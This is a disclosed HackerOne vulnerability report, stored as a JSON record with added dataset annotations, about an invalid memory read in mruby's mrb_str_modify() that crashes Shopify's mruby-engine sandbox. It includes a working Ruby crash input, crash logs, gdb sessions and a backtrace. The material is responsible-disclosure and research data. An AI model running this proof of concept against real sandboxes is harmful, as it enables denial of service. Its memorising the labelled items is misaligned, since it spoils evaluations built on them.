{
  "reported_to": "shopify-scripts",
  "reported_by": "jpenalbae ",
  "title": "SIGSEGV on mruby mrb_str_modify() (Invalid memory access)",
  "content": "\nThere is an invalid memory read on mruby when calling to mrb_str_modify() with a invalid RString * which causes a SIGSEGV and leads to denial of service.\nSample\nThe following code triggers the bug (attached as mrb_str_modify.min.rb):\nCode 138 Bytes\n1def n\n2if $0\n3end\n4\"\"if 00end\n5qqq=Proc.new{|*x|x.join}\n6qqq.(\"\",<<000,\"\",\n7000\n8\"\")\n9qqq.(\"\",\"#{<<000}\",\n10000\n11\"\")\n120[<<0000,\n13#{<<0000}\n140000\n150000\n160]\nCrash\nHere we can see the crash (full crash output attached)\nCode 2.40 KiB\n1$ bin/sandbox /tmp/mrb_str_modify.min.rb\n2bin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001\n3ruby 2.3.1p112 (2016-04-26) [x86_64-linux-gnu]\n4\n5-- Control frame information -----------------------------------------------\n6c:0003 p:---- s:0010 e:000009 CFUNC  :sandbox_eval\n7c:0002 p:0201 s:0005 E:000518 EVAL   bin/sandbox:21 [FINISH]\n8c:0001 p:0000 s:0002 E:000730 (none) [FINISH]\n9\n10-- Ruby level backtrace information ----------------------------------------\n11bin/sandbox:21:in `<main>'\n12bin/sandbox:21:in `sandbox_eval'\n13\n14-- Machine register context ------------------------------------------------\n15 RIP: 0x00007f423c11d17b RBP: 0x00007f423ac954e0 RSP: 0x00007f423ac93a80\n16 RAX: 0x0000000000000002 RBX: 0x0000000000000001 RCX: 0x00007f423aca7b00\n17 RDX: 0x00007f423ac9cf80 RDI: 0x00007f423ac954e0 RSI: 0x0000000000000001\n18  R8: 0x00007f423ac953e0  R9: 0x00007f423acbc6a0 R10: 0x0000000000000330\n19 R11: 0x00007f423c11e670 R12: 0x00007f423ac954e0 R13: 0x00007f423ac9cf80\n20 R14: 0x00007f423ac954e0 R15: 0x000000000100c03e EFL: 0x0000000000010202\n21\n22-- C level backtrace information -------------------------------------------\n23/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042dea5]\n24/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f424042e0dc]\n25/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f4240308364]\n26/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f42403b9dbe]\n27/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f424008ced0]\n28/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_modify+0xb) [0x7f423c11d17b] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:659\n29/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_str_concat+0x18) [0x7f423c11e688] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758\n30/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x2243) [0x7f423c12e7d3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219\n31/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f423c132567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n32/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f423c106173] ../../../../ext/mruby_engine/eval_monitored.c:68\n33/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f4240083464]\n34/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7f423f3ff30d]\nCrash debug\nCode 1.27 KiB\n1(gdb) r\n2Starting program: /usr/bin/ruby /home/jaime/research/shopy/mruby-engine/bin/sandbox /tmp/mrb_str_modify.min.rb\n3[Thread debugging using libthread_db enabled]\n4Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n5[New Thread 0x7ffff7ff5700 (LWP 30942)]\n6[New Thread 0x7ffff2348700 (LWP 30993)]\n7\n8Program received signal SIGSEGV, Segmentation fault.\n9[Switching to Thread 0x7ffff2348700 (LWP 30993)]\n10mrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660\n11660       check_frozen(mrb, s);\n12(gdb) x/1i $rip\n13=> 0x7ffff37d117b <mrb_str_modify+11>:  mov    eax,DWORD PTR [rsi]\n14(gdb) i r rsi\n15rsi            0x1      1\n16(gdb) print (mrb_value)$rsi\n17$1 = {\n18  value = {\n19    p = 0x1,\n20    {\n21      i_flag = 1,\n22      i = 0\n23    },\n24    {\n25      sym_flag = 1,\n26      sym = 0\n27    },\n28    bp = 0x1,\n29    fp = 0x1,\n30    vp = 0x1\n31  },\n32  w = 1\n33}\n34(gdb) list *$rip\n350x7ffff37d117b is in mrb_str_modify (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:504).\n36499     }\n37500\n38501     static void\n39502     check_frozen(mrb_state *mrb, struct RString *s)\n40503     {\n41504       if (RSTR_FROZEN_P(s)) {\n42505         mrb_raise(mrb, E_RUNTIME_ERROR, \"can't modify frozen string\");\n43506       }\n44507     }\n45508\n46(gdb)\nBacktrace\nCode 1.02 KiB\n1(gdb) bt\n2#0  mrb_str_modify (mrb=mrb@entry=0x7ffff23494e0, s=s@entry=0x1) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:660\n3#1  0x00007ffff37d2688 in mrb_str_concat (mrb=mrb@entry=0x7ffff23494e0, self=..., other=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/string.c:758\n4#2  0x00007ffff37e27d3 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=<optimized out>, proc@entry=0x7ffff2351310, pc=<optimized out>) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2219\n5#3  0x00007ffff37e6567 in mrb_vm_run (mrb=0x7ffff23494e0, proc=0x7ffff2351310, self=..., stack_keep=stack_keep@entry=0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n6#4  0x00007ffff37ba173 in mruby_engine_monitored_eval (data=0x7ffff23493e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n7#5  0x00007ffff7737464 in start_thread (arg=0x7ffff2348700) at pthread_create.c:333\n8#6  0x00007ffff6ab330d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109\nThe crash happens at mruby-engine/ext/mruby_engine/mruby/src/string.c:504 which is built inline\nCode 186 Bytes\n1static void\n2check_frozen(mrb_state *mrb, struct RString *s)\n3{\n4  if (RSTR_FROZEN_P(s)) {   // <-- Bug happens here\n5    mrb_raise(mrb, E_RUNTIME_ERROR, \"can't modify frozen string\");\n6  }\n7}\nActually mrb_str_concat() performs a cast of the argument mrb_value self to a RString * pointer, this generates an invalid pointer which is passed to mrb_str_modify() and later on to check_frozen() which tries to read from it and produces the crash.\nImpact\nIts impact seems to be DoS of the service running the sandbox service. I doubt this would be exploitable, but I have seen the memory address being read change in between samples. If an attacker would be able to control this value it could lead to a write-what-where type vulnerability. But I highly doubt this would be possible to control.\nSamples generating different invalid addresses have been attached.\nCode 229 Bytes\n1$ bin/sandbox /tmp/mrb_str_modify.rb 2>&1 | head -1\n2bin/sandbox:21: [BUG] Segmentation fault at 0x00000000000003\n3$ bin/sandbox /tmp/mrb_str_modify.min.rb 2>&1 | head -1\n4bin/sandbox:21: [BUG] Segmentation fault at 0x00000000000001\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1481959800,
  "report_url": "https://hackerone.com/reports/183231",
  "is_multi_component": false,
  "complexity": "MEDIUM",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a Ruby script with the provided code that triggers the bug when executed in mruby"
    ],
    [
      2,
      "Run the script in the mruby environment to observe the segmentation fault caused by invalid memory access"
    ]
  ],
  "vuln_description": "The vulnerability is an invalid memory read in mruby when calling mrb_str_modify() with an invalid RString pointer, leading to a segmentation fault and potential denial of service. The crash occurs when the function attempts to check if a string is frozen by accessing an invalid memory address.",
  "reason": "The vulnerability involves understanding the internal string handling mechanisms of mruby and how invalid pointers can be passed through the string manipulation functions. The attack requires crafting specific Ruby code that triggers this edge case in the string handling logic, but does not involve complex interactions between multiple components or states.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}